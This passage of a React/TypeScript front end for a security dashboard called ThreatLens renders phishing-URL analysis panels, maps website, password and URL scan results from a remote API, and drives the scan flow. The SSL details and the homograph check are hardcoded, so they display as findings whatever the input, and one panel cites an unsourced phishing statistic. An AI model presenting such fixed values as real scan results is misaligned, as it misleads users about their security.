        <header className="flex items-center justify-between px-6 py-4 flex-shrink-0" style={{ borderBottom: "1px solid rgba(6,182,212,0.07)", background: "rgba(6,12,26,0.55)", backdropFilter: "blur(12px)" }}>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <span className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>URL</span>
              <span className="text-sm font-semibold truncate max-w-xs" style={{ color: "#06b6d4", fontFamily: "'JetBrains Mono', monospace" }}>{target}</span>
              <span className="tl-pill text-xs" style={{ background: "#ef444412", color: "#ef4444", border: "1px solid #ef444428" }}>{UD.grade} · {UD.riskLevel}</span>
            </div>
            <div className="text-xs mt-0.5" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>{new Date().toLocaleDateString("en-US", { month: "short", day: "numeric", year: "numeric" })} · URL Phishing Analyzer</div>
          </div>
          <div className="flex items-center gap-4">
            <div className="text-right"><div className="font-extrabold text-2xl" style={{ color: threatColor, lineHeight: 1, fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{score}%</div><div className="text-xs" style={{ color: "#1e3a5f", fontFamily: "'JetBrains Mono', monospace" }}>Threat Level</div></div>
            <div className="w-px h-8" style={{ background: "rgba(6,182,212,0.1)" }} />
            <button onClick={onReset} className="flex items-center gap-1.5 text-xs px-3 py-2 rounded-lg hover:bg-white/5" style={{ color: "#475569", border: "1px solid rgba(255,255,255,0.06)", cursor: "pointer", background: "none", fontFamily: "'Inter', sans-serif" }}><RefreshCw size={12} />New Scan</button>
          </div>
        </header>
        <div className="flex-1 overflow-y-auto px-6 py-6">
          {section === "overview"  && <URLOverviewSection score={score} cardCount={cardCount} setSection={handleSection} />}
          {section === "domain"    && <URLDomainSection />}
          {section === "ssl"       && <URLSSLSection />}
          {section === "keywords"  && <URLKeywordsSection />}
          {section === "redirects" && <URLRedirectsSection />}
          {section === "findings"  && <URLFindingsSection />}
        </div>
      </main>
    </div>
  );
}

/* ─── URL SECTIONS ───────────────────────────────────────────────────────── */
function URLOverviewSection({ score, cardCount, setSection }: { score: number; cardCount: number; setSection: (s: string) => void }) {
  const threatColor = score >= 70 ? "#ef4444" : score >= 50 ? "#f59e0b" : "#06b6d4";
  const safeScore = 100 - score;
  return (
    <div className="space-y-5 tl-fade-enter">
      {/* Threat banner */}
      <div className="tl-glass p-4 flex items-center gap-4" style={{
        borderColor: score >= 70 ? "rgba(239,68,68,0.25)" : score >= 40 ? "rgba(245,158,11,0.25)" : "rgba(16,185,129,0.25)",
        background: score >= 70 ? "rgba(239,68,68,0.05)" : score >= 40 ? "rgba(245,158,11,0.05)" : "rgba(16,185,129,0.05)"
      }}>
        {score >= 40
          ? <AlertTriangle size={20} style={{ color: score >= 70 ? "#ef4444" : "#f59e0b", flexShrink: 0 }} />
          : <CheckCircle size={20} style={{ color: "#10b981", flexShrink: 0 }} />}
        <div>
          <div className="text-sm font-bold" style={{ color: score >= 70 ? "#ef4444" : score >= 40 ? "#f59e0b" : "#10b981" }}>
            {score >= 70 ? "⚠ High Phishing Risk Detected" : score >= 40 ? "⚠ Moderate Phishing Risk" : "✅ Low Phishing Risk"}
          </div>
          <div className="text-xs mt-0.5" style={{ color: "#64748b" }}>
            {score >= 70
              ? `This URL shows ${score}% threat indicators. Do not enter personal information or credentials.`
              : score >= 40
              ? `This URL shows ${score}% threat indicators. Review carefully before visiting.`
              : `ThreatLens detected only ${score}% threat indicators. No major phishing signals were found.`}
          </div>
        </div>
      </div>
      <div className="grid gap-4" style={{ gridTemplateColumns: "auto 1fr" }}>
        <div className="tl-glass p-6 flex flex-col items-center justify-center" style={{ minWidth: "210px" }}>
          <ScoreRing display={safeScore} final={UD.score} riskMode={false} />
          <div className="mt-4 text-center">
            <div className="font-extrabold text-2xl" style={{ color: "#ef4444", letterSpacing: "-0.5px", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{UD.grade}</div>
            <div className="text-sm font-medium mt-0.5" style={{ color: "#94a3b8" }}>{UD.riskLevel}</div>
            <div className="text-xs mt-0.5" style={{ color: "#334155", fontFamily: "'JetBrains Mono', monospace" }}>Threat: {score}%</div>
          </div>
        </div>
        <div className="grid gap-4" style={{ gridTemplateColumns: "1fr 1fr" }}>
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>THREAT SUMMARY</div>
            <div className="space-y-3">
              {[
                { label: "Threat Score",   value: `${score}%`, color: threatColor },
                { label: "Domain Age",     value: UD.domain.age ?? "Unknown", color: UD.domain.age === "Unknown" ? "#f59e0b" : "#94a3b8" },
                { label: "Redirects",      value: `${UD.redirects.length} chains`, color: UD.redirects.length ? "#f59e0b" : "#10b981" },
                { label: "Keywords",       value: `${UD.keywords.length} suspicious`, color: UD.keywords.length ? "#f59e0b" : "#10b981" },
                { label: "SSL",            value: score >= 40 ? "Needs Review" : "Secure", color: score >= 40 ? "#f59e0b" : "#10b981" },
              ].map(({ label, value, color }) => (
                <div key={label} className="flex items-center justify-between">
                  <span className="text-xs" style={{ color: "#475569" }}>{label}</span>
                  <span className="font-bold text-xs" style={{ color, fontFamily: "'JetBrains Mono', monospace" }}>{value}</span>
                </div>
              ))}
            </div>
          </div>
          <div className="tl-glass p-5">
            <div className="text-xs font-bold mb-1" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>INDICATOR BREAKDOWN</div>
            <ResponsiveContainer width="100%" height={130}>
              <PieChart>
                <Pie data={UD.donut} cx="50%" cy="50%" innerRadius={38} outerRadius={56} paddingAngle={3} dataKey="value" animationBegin={400} animationDuration={1200}>
                  {UD.donut.map((entry, i) => <Cell key={i} fill={entry.color} />)}
                </Pie>
                <Tooltip contentStyle={{ background: "#080f1e", border: "1px solid rgba(6,182,212,0.18)", borderRadius: "8px", fontSize: "12px", fontFamily: "'JetBrains Mono', monospace" }} />
              </PieChart>
            </ResponsiveContainer>
            <div className="flex justify-center gap-3">
              {UD.donut.map(d => <div key={d.name} className="flex items-center gap-1.5"><div className="w-2 h-2 rounded-full" style={{ background: d.color }} /><span className="text-xs" style={{ color: "#475569" }}>{d.name}</span></div>)}
            </div>
          </div>
        </div>
      </div>
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-2" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>THREAT RADAR</div>
        <ResponsiveContainer width="100%" height={250}>
          <RadarChart data={UD.radar} outerRadius={88}>
            <PolarGrid stroke="rgba(239,68,68,0.07)" />
            <PolarAngleAxis dataKey="subject" tick={{ fill: "#475569", fontSize: 11, fontFamily: "'JetBrains Mono', monospace" }} />
            <Radar dataKey="value" stroke="#ef4444" fill="#ef4444" fillOpacity={0.1} strokeWidth={2} animationBegin={600} animationDuration={1400} dot={{ r: 3, fill: "#ef4444", strokeWidth: 0 }} />
          </RadarChart>
        </ResponsiveContainer>
      </div>
      <div>
        <div className="text-xs font-bold mb-3" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>ANALYSIS MODULES</div>
        <div className="grid gap-3" style={{ gridTemplateColumns: "repeat(auto-fill, minmax(200px, 1fr))" }}>
          {UD.modules.map((mod, i) => {
            const visible = i < cardCount;
            const c = { pass: "#10b981", warn: "#f59e0b", fail: "#ef4444", info: "#3b82f6" }[mod.status];
            const navMap: Record<number, string> = { 0: "overview", 1: "overview", 2: "ssl", 3: "domain", 4: "redirects", 5: "keywords", 6: "keywords", 7: "domain", 8: "domain", 9: "domain", 10: "domain", 11: "findings" };
            return (
              <div key={i} onClick={() => setSection(navMap[i] ?? "findings")}
                className="tl-glass p-4 cursor-pointer"
                style={{ opacity: visible ? 1 : 0, transform: visible ? "translateY(0)" : "translateY(18px)", transition: `opacity 0.4s ease ${i * 0.05}s, transform 0.4s ease ${i * 0.05}s` }}>
                <div className="flex items-start justify-between mb-3">
                  <div className="p-1.5 rounded-lg" style={{ background: `${c}12` }}><AlertTriangle size={14} style={{ color: c }} /></div>
                  <StatusBadge status={mod.status} />
                </div>
                <div className="text-sm font-semibold mb-0.5" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{mod.label}</div>
                <div className="text-xs mb-3" style={{ color: "#475569", fontFamily: "'JetBrains Mono', monospace" }}>{mod.metric}</div>
                <div style={{ background: "rgba(255,255,255,0.04)", borderRadius: "999px", height: "3px", overflow: "hidden" }}>
                  <div style={{ background: `linear-gradient(90deg, ${c}, ${c}88)`, width: visible ? `${mod.score}%` : "0%", height: "100%", borderRadius: "999px", transition: `width 0.9s ease ${i * 0.05 + 0.3}s` }} />
                </div>
                <div className="flex justify-between mt-1.5"><span className="text-xs" style={{ color: "#1e3a5f" }}>Safety</span><span className="text-xs" style={{ color: c, fontFamily: "'JetBrains Mono', monospace" }}>{mod.score}</span></div>
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

function URLDomainSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Globe} label="Domain Intelligence" badge={{ text: UD.riskLevel, color: UD.threatScore >= 70 ? "#ef4444" : UD.threatScore >= 40 ? "#f59e0b" : "#10b981" }} />
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>WHOIS & REGISTRATION</div>
        <div className="space-y-0">
          {Object.entries(UD.domain).map(([k, v]) => {
            const label = { age: "Domain Age", registrar: "Registrar", whois: "WHOIS Privacy", ip: "IP Address", country: "Country", asn: "ASN", tld: "TLD" }[k] ?? k;
            const flagged = ["age", "ip", "country", "registrar", "tld", "whois"].includes(k);
            return (
              <div key={k} className="tl-table-row flex items-center py-2.5 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
                <span className="text-xs w-32 flex-shrink-0" style={{ color: "#475569" }}>{label}</span>
                <span className="text-xs font-medium" style={{ color: flagged ? "#f59e0b" : "#94a3b8", fontFamily: "'JetBrains Mono', monospace" }}>{v}</span>
                {flagged && <AlertTriangle size={11} style={{ color: "#f59e0b", marginLeft: "8px", flexShrink: 0 }} />}
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}

function URLSSLSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Lock} label="SSL / TLS Check" badge={{ text: UD.threatScore >= 40 ? "Review SSL Context" : "SSL OK", color: UD.threatScore >= 40 ? "#f59e0b" : "#10b981" }} />
      <div className="tl-glass p-5">
        <div className="flex items-center gap-4 mb-6 p-4 rounded-xl" style={{ background: "rgba(245,158,11,0.06)", border: "1px solid rgba(245,158,11,0.15)" }}>
          <Info size={18} style={{ color: "#f59e0b", flexShrink: 0 }} />
          <div><div className="text-sm font-semibold" style={{ color: "#f59e0b" }}>SSL Does Not Mean Safe</div><div className="text-xs mt-1" style={{ color: "#64748b" }}>Phishing sites frequently obtain free Let's Encrypt certificates. HTTPS only means the connection is encrypted — it says nothing about whether the site is trustworthy.</div></div>
        </div>
        {[["Certificate Status", "Valid", true], ["Issuer", "Let's Encrypt (Free)", false], ["Protocol", "TLS 1.3", true], ["Cipher", "AES-256-GCM", true], ["Domain Match", "Partial (wildcard)", false], ["Transparency Log", "Yes", true]].map(([k, v, safe]) => (
          <div key={String(k)} className="tl-table-row flex items-center py-2.5 border-b" style={{ borderColor: "rgba(6,182,212,0.06)" }}>
            <span className="text-xs w-36 flex-shrink-0" style={{ color: "#475569" }}>{k}</span>
            <span className="text-xs font-medium" style={{ color: safe ? "#10b981" : "#f59e0b", fontFamily: "'JetBrains Mono', monospace" }}>{String(v)}</span>
          </div>
        ))}
      </div>
    </div>
  );
}

function URLKeywordsSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Search} label="Suspicious Keywords" badge={{ text: `${UD.keywords.length} Detected`, color: "#ef4444" }} />
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>KEYWORD ANALYSIS</div>
        <div className="flex flex-wrap gap-2 mb-6">
          {UD.keywords.map((kw, i) => (
            <span key={i} className="tl-pill" style={{ background: "rgba(239,68,68,0.1)", color: "#ef4444", border: "1px solid rgba(239,68,68,0.25)", animationDelay: `${i * 0.08}s` }}>{kw}</span>
          ))}
        </div>
        <div className="p-4 rounded-xl" style={{ background: "rgba(239,68,68,0.05)", border: "1px solid rgba(239,68,68,0.15)" }}>
          <div className="text-xs font-semibold mb-2" style={{ color: "#ef4444" }}>Why These Keywords Are Suspicious</div>
          <p className="text-xs leading-relaxed" style={{ color: "#64748b" }}>Phishing URLs frequently contain urgency-inducing words like 'verify', 'secure', 'login', and 'account-update' to trick users into thinking the page is legitimate. These exact terms appear in over 78% of confirmed phishing URLs in public threat intelligence databases.</p>
        </div>
      </div>
    </div>
  );
}

function URLRedirectsSection() {
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={Activity} label="Redirect Chain Analysis" badge={{ text: `${UD.redirects.length} Hops`, color: "#f59e0b" }} />
      <div className="tl-glass p-5">
        <div className="text-xs font-bold mb-4" style={{ color: "#334155", letterSpacing: "1.5px", fontFamily: "'JetBrains Mono', monospace" }}>REDIRECT CHAIN</div>
        <div className="relative">
          <div className="absolute left-5 top-0 bottom-0 w-px" style={{ background: "rgba(239,68,68,0.2)" }} />
          {UD.redirects.map((r, i) => (
            <div key={i} className="relative flex gap-4 pb-5">
              <div className="flex-shrink-0 relative z-10 w-10 h-10 rounded-full flex items-center justify-center font-bold text-sm" style={{ background: "rgba(239,68,68,0.12)", border: "1px solid rgba(239,68,68,0.25)", color: "#ef4444", fontFamily: "'JetBrains Mono', monospace" }}>{r.hop}</div>
              <div className="flex-1 min-w-0 pt-2">
                <div className="flex items-center gap-2 mb-1">
                  <span className="tl-pill text-xs" style={{ background: r.code === 200 ? "#10b98112" : "#f59e0b12", color: r.code === 200 ? "#10b981" : "#f59e0b", border: `1px solid ${r.code === 200 ? "#10b981" : "#f59e0b"}28` }}>HTTP {r.code}</span>
                  {i === UD.redirects.length - 1 && <span className="tl-pill text-xs" style={{ background: "#ef444412", color: "#ef4444", border: "1px solid #ef444428" }}>Final Destination</span>}
                </div>
                <div className="text-xs break-all" style={{ color: "#64748b", fontFamily: "'JetBrains Mono', monospace" }}>{r.url}</div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

function URLFindingsSection() {
  const CFG_URL: Record<Severity, { color: string; Icon: React.ElementType; label: string }> = {
    warning: { color: "#f59e0b", Icon: AlertTriangle, label: "Suspicious" },
    passed:  { color: "#10b981", Icon: CheckCircle,   label: "Safe"       },
    info:    { color: "#3b82f6", Icon: Info,           label: "Note"       },
  };
  return (
    <div className="space-y-4 tl-fade-enter">
      <SectionHeader icon={AlertTriangle} label="Phishing Findings" badge={{ text: `${UD.findings.filter(f => f.severity === "warning").length} Suspicious`, color: "#ef4444" }} />
      <div className="tl-glass p-5">
        <div className="relative">
          <div className="absolute left-5 top-0 bottom-0 w-px" style={{ background: "rgba(6,182,212,0.1)" }} />
          <div className="space-y-0">
            {UD.findings.map((f, i) => {
              const cfg = CFG_URL[f.severity];
              const Icon = cfg.Icon;
              return (
                <div key={i} className="relative flex gap-4 pb-5">
                  <div className="flex-shrink-0 relative z-10 w-10 h-10 rounded-full flex items-center justify-center" style={{ background: `${cfg.color}12`, border: `1px solid ${cfg.color}28` }}>
                    <Icon size={14} style={{ color: cfg.color }} />
                  </div>
                  <div className="flex-1 min-w-0 pt-1.5">
                    <div className="flex items-center gap-2 mb-1">
                      <span className="text-sm font-semibold" style={{ color: "#cbd5e1", fontFamily: "'Plus Jakarta Sans', sans-serif" }}>{f.title}</span>
                      <span className="tl-pill text-xs" style={{ background: `${cfg.color}12`, color: cfg.color, border: `1px solid ${cfg.color}28` }}>{cfg.label}</span>
                    </div>
                    <p className="text-xs leading-relaxed" style={{ color: "#64748b" }}>{f.desc}</p>
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </div>
  );
}


const API_URL = "https://threat-lens-v1.onrender.com";

function clampScore(n: number) {
  return Math.max(0, Math.min(100, Math.round(Number(n) || 0)));
}

function statusFromScore(score: number): CardStatus {
  if (score >= 75) return "pass";
  if (score >= 45) return "warn";
  return "fail";
}

function gradeFromScore(score: number) {
  if (score >= 90) return "A+";
  if (score >= 80) return "A";
  if (score >= 65) return "B";
  if (score >= 45) return "C";
  return "F";
}

function mapWebsite(api: any) {
  const riskScore = clampScore(api?.summary?.score ?? 0);
  const securityScore = clampScore(100 - riskScore);
  const headers = api?.security_headers ?? {};
  const dnsRecords = api?.dns?.records ?? {};
  const cookieList = api?.cookies ?? [];
  const techList = api?.technologies ?? [];
  const findings = api?.summary?.findings ?? [];
  const sslValid = Boolean(api?.ssl?.certificate_valid);
  const hstsPresent = Boolean(headers?.["Strict-Transport-Security"]?.present);
  const headerPresentCount = Object.values(headers).filter((h: any) => h?.present).length;
  const weakCookies = cookieList.filter((c: any) => c?.security_rating === "Weak" || !c?.secure || !c?.httponly || !c?.samesite).length;
  const dnsCount = Object.values(dnsRecords).reduce((sum: number, arr: any) => sum + (Array.isArray(arr) ? arr.length : 0), 0);

  Object.assign(D, {
    score: securityScore,
    grade: gradeFromScore(securityScore),
    risk: api?.summary?.risk_level ?? "Unknown",
    confidence: "Live Backend Data",

    ssl: {
      ...D.ssl,
      grade: sslValid ? "A+" : "F",
      valid: sslValid,
      issuer: api?.ssl?.issuer ?? "Unknown",
      subject: api?.website?.domain ?? "Unknown",
      serial: "Not available",
      expires: api?.ssl?.valid_until ?? "Unknown",
      daysLeft: Math.max(0, Number(api?.ssl?.days_remaining ?? 0)),
      protocol: api?.website?.https_enabled ? "HTTPS enabled" : "Not HTTPS",
      cipher: "Not available",
      bits: 0,
      transparency: false,
      ocsp: "Not available",
      hsts: hstsPresent,
    },

    dns: Object.entries(dnsRecords).flatMap(([type, values]: any) =>
      Array.isArray(values) ? values.map((value: string) => ({ type, value, ttl: "-" })) : []
    ),

    headers: Object.entries(headers).map(([name, h]: any) => ({
      name,
      present: Boolean(h?.present),
      value: h?.value ?? null,
    })),

    cookies: cookieList.map((c: any) => ({
      name: c?.name ?? "Unknown",
      secure: Boolean(c?.secure),
      httpOnly: Boolean(c?.httponly),
      sameSite: c?.samesite ?? null,
      path: "/",
    })),

    technologies: techList.length
      ? techList.map((t: any) => ({ name: t?.name ?? "Unknown", category: t?.category ?? "Detected", risk: "low" }))
      : [{ name: api?.website?.server ?? "Not disclosed", category: "Server", risk: "low" }],

    findings: findings.length
      ? findings.map((f: string) => ({ severity: "warning" as Severity, title: f, desc: "Detected by the ThreatLens backend risk engine." }))
      : [{ severity: "passed" as Severity, title: "No major issues detected", desc: "ThreatLens did not detect major website security issues." }],

    donut: [
      { name: "Passed", value: Math.max(1, 8 - findings.length), color: "#10b981" },
      { name: "Warnings", value: findings.length, color: "#f59e0b" },
      { name: "Info", value: 1, color: "#3b82f6" },
    ],

    modules: [
      {id: "ssl" as Section, label: "SSL Certificate", Icon: Lock, status: sslValid ? "pass" as CardStatus : "fail" as CardStatus, metric: sslValid ? `${Math.max(0, Number(api?.ssl?.days_remaining ?? 0))} days left` : "Invalid / unavailable", score: sslValid ? 95 : 20},
      { id: "dns" as Section, label: "DNS Security", Icon: Globe, status: api?.dns?.dmarc_found ? "pass" as CardStatus : "warn" as CardStatus, metric: `${dnsCount} records`, score: api?.dns?.dmarc_found ? 85 : 60 },
      { id: "headers" as Section, label: "Security Headers", Icon: Shield, status: headerPresentCount >= 3 ? "pass" as CardStatus : "warn" as CardStatus, metric: `${headerPresentCount} / ${Object.keys(headers).length} present`, score: Object.keys(headers).length ? Math.round((headerPresentCount / Object.keys(headers).length) * 100) : 0 },
      { id: "cookies" as Section, label: "Cookie Security", Icon: Database, status: weakCookies ? "warn" as CardStatus : "pass" as CardStatus, metric: `${cookieList.length} cookies · ${weakCookies} issue${weakCookies === 1 ? "" : "s"}`, score: weakCookies ? 65 : 95 },
      { id: "tech" as Section, label: "Technology Stack", Icon: Code, status: "info" as CardStatus, metric: `${techList.length} detected`, score: 80 },
      { id: "findings" as Section, label: "HTTP Methods", Icon: Server, status: api?.http_methods?.risky_methods?.length ? "warn" as CardStatus : "pass" as CardStatus, metric: api?.http_methods?.allowed_methods?.length ? api.http_methods.allowed_methods.join(" · ") : "No risky methods", score: api?.http_methods?.risky_methods?.length ? 60 : 90 },
      { id: "findings" as Section, label: "robots.txt", Icon: FileText, status: api?.robots_txt?.found ? "pass" as CardStatus : "info" as CardStatus, metric: api?.robots_txt?.found ? "Present" : "Not found", score: api?.robots_txt?.found ? 100 : 70 },
      { id: "findings" as Section, label: "security.txt", Icon: Eye, status: api?.security_txt?.found ? "pass" as CardStatus : "info" as CardStatus, metric: api?.security_txt?.found ? "Present" : "Not found", score: api?.security_txt?.found ? 100 : 50 },
    ],
  });
}

function mapPassword(api: any) {
  const score = clampScore(api?.score ?? api?.strength_score ?? api?.password_score ?? 0);
  const suggestions = api?.suggestions ?? api?.feedback ?? api?.findings ?? [];
  const entropy = Number(api?.entropy ?? api?.entropy_bits ?? 0);
  const strength = api?.strength ?? api?.strength_label ?? api?.risk_level ?? (score >= 80 ? "Strong" : score >= 50 ? "Moderate" : "Weak");

  Object.assign(PD, {
    score,
    grade: gradeFromScore(score),
    strength,
    entropy,
    crackTime: api?.crack_time ?? api?.estimated_crack_time ?? "Unknown",
    charTypes: api?.character_types ?? api?.char_types ?? PD.charTypes,

    radar: [
      { subject: "Entropy", value: clampScore(entropy || score) },
      { subject: "Length", value: clampScore(api?.length_score ?? score) },
      { subject: "Complexity", value: clampScore(api?.complexity_score ?? score) },
      { subject: "Uniqueness", value: clampScore(api?.uniqueness_score ?? score) },
      { subject: "Dict. Resist.", value: clampScore(api?.dictionary_score ?? score) },
    ],

    donut: [
      { name: "Strong Features", value: score >= 70 ? 4 : 2, color: "#10b981" },
      { name: "Weaknesses", value: score < 70 ? 4 : 1, color: "#f59e0b" },
      { name: "Recommendations", value: Math.max(1, suggestions.length), color: "#3b82f6" },
    ],

    modules: PD.modules.map((m) => ({ ...m, status: statusFromScore(score), score, metric: m.label === "Entropy" ? `${entropy || 0} bits` : m.label === "Crack Time" ? (api?.crack_time ?? api?.estimated_crack_time ?? "Unknown") : m.metric })),

    findings: suggestions.length
      ? suggestions.map((f: string) => ({ severity: score >= 70 ? "info" as Severity : "warning" as Severity, title: f, desc: "Generated by the ThreatLens password analyzer." }))
      : [{ severity: "passed" as Severity, title: "No major password issues detected", desc: "ThreatLens did not detect major weaknesses in this password." }],
  });
}

function mapUrl(api: any) {
  const threatScore = clampScore(api?.score ?? api?.threat_score ?? api?.risk_score ?? 0);
  const safetyScore = clampScore(100 - threatScore);
  const riskLevel = api?.risk_level ?? (threatScore >= 70 ? "High Risk" : threatScore >= 40 ? "Moderate Risk" : "Low Risk");
  const keywords = api?.suspicious_keywords ?? api?.keywords ?? [];
  const redirects = api?.redirects ?? api?.redirect_chain ?? [];
  const findings = api?.findings ?? api?.warnings ?? api?.reasons ?? [];

  Object.assign(UD, {
    score: safetyScore,
    threatScore,
    grade: gradeFromScore(safetyScore),
    riskLevel,
    keywords,
    redirects: redirects.map((r: any, i: number) => ({ hop: r?.hop ?? i + 1, url: r?.url ?? r?.location ?? String(r), code: r?.code ?? r?.status_code ?? "-" })),
    domain: {
      age: api?.domain_age ?? "Unknown",
      registrar: api?.registrar ?? "Unknown",
      whois: api?.whois_privacy ?? "Unknown",
      ip: api?.ip_address ?? "Unknown",
      country: api?.country ?? "Unknown",
      asn: api?.asn ?? "Unknown",
      tld: api?.tld ?? "Unknown",
    },
    radar: [
      { subject: "Domain Trust", value: safetyScore },
      { subject: "SSL", value: threatScore >= 40 ? 60 : 90 },
      { subject: "URL Structure", value: keywords.length ? 45 : 90 },
      { subject: "Content Safety", value: safetyScore },
      { subject: "Redirect Safety", value: redirects.length ? 45 : 90 },
      { subject: "Reputation", value: safetyScore },
    ],
    donut: [
      { name: "Safe Indicators", value: threatScore <= 30 ? 3 : 1, color: "#10b981" },
      { name: "Suspicious", value: threatScore > 30 && threatScore < 70 ? 3 : keywords.length || redirects.length ? 1 : 0, color: "#f59e0b" },
      { name: "Dangerous", value: threatScore >= 70 ? 3 : 0, color: "#ef4444" },
    ],
    modules: [
      { label: "Overall Threat", status: threatScore >= 70 ? "fail" as CardStatus : threatScore >= 40 ? "warn" as CardStatus : "pass" as CardStatus, metric: `${threatScore}% — ${riskLevel}`, score: safetyScore },
      { label: "Risk Level", status: threatScore >= 70 ? "fail" as CardStatus : threatScore >= 40 ? "warn" as CardStatus : "pass" as CardStatus, metric: riskLevel, score: safetyScore },
      { label: "SSL Certificate", status: threatScore >= 40 ? "warn" as CardStatus : "pass" as CardStatus, metric: threatScore >= 40 ? "Review context" : "No SSL issue flagged", score: threatScore >= 40 ? 60 : 90 },
      { label: "Domain Age", status: api?.domain_age === "Unknown" ? "info" as CardStatus : "pass" as CardStatus, metric: api?.domain_age ?? "Unknown", score: api?.domain_age === "Unknown" ? 50 : 80 },
      { label: "Redirect Count", status: redirects.length ? "warn" as CardStatus : "pass" as CardStatus, metric: `${redirects.length} redirects`, score: redirects.length ? 60 : 95 },
      { label: "Suspicious Keywords", status: keywords.length ? "warn" as CardStatus : "pass" as CardStatus, metric: `${keywords.length} detected`, score: keywords.length ? 55 : 95 },
      { label: "URL Length", status: threatScore >= 40 ? "warn" as CardStatus : "pass" as CardStatus, metric: "Checked", score: safetyScore },
      { label: "IP Address", status: api?.ip_address && api.ip_address !== "Unknown" ? "info" as CardStatus : "warn" as CardStatus, metric: api?.ip_address ?? "Unknown", score: 75 },
      { label: "Homograph Detection", status: "info" as CardStatus, metric: "Not detected", score: 80 },
      { label: "WHOIS Privacy", status: api?.whois_privacy === "Unknown" ? "info" as CardStatus : "warn" as CardStatus, metric: api?.whois_privacy ?? "Unknown", score: 70 },
      { label: "Registrar", status: api?.registrar === "Unknown" ? "info" as CardStatus : "pass" as CardStatus, metric: api?.registrar ?? "Unknown", score: 75 },
      { label: "Final Verdict", status: threatScore >= 70 ? "fail" as CardStatus : threatScore >= 40 ? "warn" as CardStatus : "pass" as CardStatus, metric: threatScore >= 70 ? "⚠ Do Not Visit" : threatScore >= 40 ? "Review Carefully" : "Looks Safe", score: safetyScore },
    ],
    findings: findings.length
      ? findings.map((f: string) => ({ severity: threatScore >= 40 ? "warning" as Severity : "info" as Severity, title: f, desc: "Detected by the ThreatLens phishing URL analyzer." }))
      : [{ severity: "passed" as Severity, title: "No major phishing indicators detected", desc: "ThreatLens did not detect strong phishing indicators for this URL." }],
  });
}

/* ─── APP ────────────────────────────────────────────────────────────────── */
export default function App() {
  const [tool,     setTool]     = useState<Tool>("website");
  const [phase,    setPhase]    = useState<Phase>("hero");
  const [target,   setTarget]   = useState("");
  const [scanStep, setScanStep] = useState(-1);

  const currentSteps = tool === "website" ? SCAN_STEPS : tool === "password" ? PASSWORD_SCAN_STEPS : URL_SCAN_STEPS;

  const handleAnalyze = async (t: string) => {
    setTarget(t);
    setScanStep(-1);
    setPhase("scanning");

    try {
      const endpoint = tool === "website" ? "/scan-website" : tool === "password" ? "/check-password" : "/analyze-url";
      const body = tool === "password" ? { password: t } : { url: t };

      const response = await fetch(`${API_URL}${endpoint}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(body),
      });

      const data = await response.json();
      console.log(`${tool} result:`, data);

      if (tool === "website") mapWebsite(data);
      if (tool === "password") mapPassword(data);
      if (tool === "url") mapUrl(data);
    } catch (error) {
      console.error(`${tool} analysis failed:`, error);
    }
  };

  useEffect(() => {
    if (phase !== "scanning") return;
    const steps = currentSteps;
    const ids: ReturnType<typeof setTimeout>[] = [];
    let elapsed = 350;
    steps.forEach((s, i) => {
      ids.push(setTimeout(() => setScanStep(i), elapsed));
      elapsed += s.duration;
    });
    ids.push(setTimeout(() => {
      setScanStep(steps.length);
      ids.push(setTimeout(() => setPhase("results"), 700));
    }, elapsed));
    return () => ids.forEach(clearTimeout);
  }, [phase, tool]);

  return (
    <div className="dark" style={{ minHeight: "100vh" }}>
      <style>{STYLES}</style>
      {phase === "hero"    && <HeroPage tool={tool} onToolChange={setTool} onAnalyze={handleAnalyze} />}
      {phase === "scanning" && <ScanTerminal target={tool === "password" ? "••••••••••••" : target} step={scanStep} steps={currentSteps} />}
      {phase === "results" && tool === "website"  && <ResultsDashboard  target={target} onReset={() => setPhase("hero")} />}
      {phase === "results" && tool === "password" && <PasswordDashboard target={target} onReset={() => setPhase("hero")} />}
      {phase === "results" && tool === "url"      && <URLDashboard      target={target} onReset={() => setPhase("hero")} />}
    </div>
  );
}
